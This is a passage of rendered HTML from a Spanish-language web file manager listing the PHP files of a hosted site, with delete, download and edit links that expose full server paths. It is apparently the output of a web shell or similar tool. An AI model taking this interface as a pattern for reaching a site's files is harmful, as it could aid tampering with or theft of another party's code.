                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/agregar.form.php::agregar.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::agregar.form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::agregar.php">agregar.php</a></td>
                    <td>Archivo</td>
                    <td>2.65 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/agregar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/agregar.php::agregar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::agregar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::anuncie.form.php">anuncie.form.php</a></td>
                    <td>Archivo</td>
                    <td>3.27 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/anuncie.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/anuncie.form.php::anuncie.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::anuncie.form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::bloqueados-cambiar.php">bloqueados-cambiar.php</a></td>
                    <td>Archivo</td>
                    <td>937 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/bloqueados-cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/bloqueados-cambiar.php::bloqueados-cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::bloqueados-cambiar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::borrador.form.php">borrador.form.php</a></td>
                    <td>Archivo</td>
                    <td>14.15 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/borrador.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/borrador.form.php::borrador.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::borrador.form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::borradores.php">borradores.php</a></td>
                    <td>Archivo</td>
                    <td>2.52 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/borradores.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/borradores.php::borradores.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::borradores.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador-google.php">buscador-google.php</a></td>
                    <td>Archivo</td>
                    <td>10.12 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador-google.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador-google.php::buscador-google.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador-google.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador-skynet.php">buscador-skynet.php</a></td>
                    <td>Archivo</td>
                    <td>16.1 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador-skynet.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador-skynet.php::buscador-skynet.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador-skynet.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador-tags.php">buscador-tags.php</a></td>
                    <td>Archivo</td>
                    <td>16.01 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador-tags.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador-tags.php::buscador-tags.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador-tags.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador.php">buscador.php</a></td>
                    <td>Archivo</td>
                    <td>19.21 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscador.php::buscador.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscador.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscadordegooles.php">buscadordegooles.php</a></td>
                    <td>Archivo</td>
                    <td>7.46 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscadordegooles.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscadordegooles.php::buscadordegooles.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscadordegooles.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscadorweb.php">buscadorweb.php</a></td>
                    <td>Archivo</td>
                    <td>19.36 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscadorweb.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/buscadorweb.php::buscadorweb.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::buscadorweb.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::cambioex.php">cambioex.php</a></td>
                    <td>Archivo</td>
                    <td>1012 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/cambioex.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/cambioex.php::cambioex.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::cambioex.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::chat.php">chat.php</a></td>
                    <td>Archivo</td>
                    <td>3.27 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/chat.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/chat.php::chat.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::chat.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::chatx.php">chatx.php</a></td>
                    <td>Archivo</td>
                    <td>3.28 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/chatx.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/chatx.php::chatx.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::chatx.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::clima.php">clima.php</a></td>
                    <td>Archivo</td>
                    <td>421 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/clima.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/clima.php::clima.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::clima.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::comentario-borrar.php">comentario-borrar.php</a></td>
                    <td>Archivo</td>
                    <td>887 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/comentario-borrar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/comentario-borrar.php::comentario-borrar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::comentario-borrar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::comentario3.php">comentario3.php</a></td>
                    <td>Archivo</td>
                    <td>2.66 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/comentario3.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/comentario3.php::comentario3.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::comentario3.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::comentarios.php">comentarios.php</a></td>
                    <td>Archivo</td>
                    <td>1.83 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/comentarios.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/comentarios.php::comentarios.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::comentarios.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::conectados.php">conectados.php</a></td>
                    <td>Archivo</td>
                    <td>3.45 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/conectados.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/conectados.php::conectados.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::conectados.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::contacto-form.php">contacto-form.php</a></td>
                    <td>Archivo</td>
                    <td>2.59 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/contacto-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/contacto-form.php::contacto-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::contacto-form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::contacto.php">contacto.php</a></td>
                    <td>Archivo</td>
                    <td>1.24 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/contacto.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/contacto.php::contacto.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::contacto.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::datos_cambiar.php">datos_cambiar.php</a></td>
                    <td>Archivo</td>
                    <td>1.19 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/datos_cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/datos_cambiar.php::datos_cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::datos_cambiar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncia-form.php">denuncia-form.php</a></td>
                    <td>Archivo</td>
                    <td>2.81 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncia-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncia-form.php::denuncia-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncia-form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncia-publica-form.php">denuncia-publica-form.php</a></td>
                    <td>Archivo</td>
                    <td>7.2 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncia-publica-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncia-publica-form.php::denuncia-publica-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncia-publica-form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncia-publica.php">denuncia-publica.php</a></td>
                    <td>Archivo</td>
                    <td>1.15 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncia-publica.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncia-publica.php::denuncia-publica.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncia-publica.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncia.php">denuncia.php</a></td>
                    <td>Archivo</td>
                    <td>1.12 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncia.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncia.php::denuncia.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncia.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncias.php">denuncias.php</a></td>
                    <td>Archivo</td>
                    <td>6.59 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncias.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncias.php::denuncias.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncias.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::edicion.form.php">edicion.form.php</a></td>
                    <td>Archivo</td>
                    <td>14.57 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/edicion.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/edicion.form.php::edicion.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::edicion.form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::edicion.php">edicion.php</a></td>
                    <td>Archivo</td>
                    <td>1.67 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/edicion.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/edicion.php::edicion.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::edicion.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::emoticones.php">emoticones.php</a></td>
                    <td>Archivo</td>
                    <td>8.57 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/emoticones.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/emoticones.php::emoticones.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::emoticones.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::enlazanos.php">enlazanos.php</a></td>
                    <td>Archivo</td>
                    <td>2.85 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
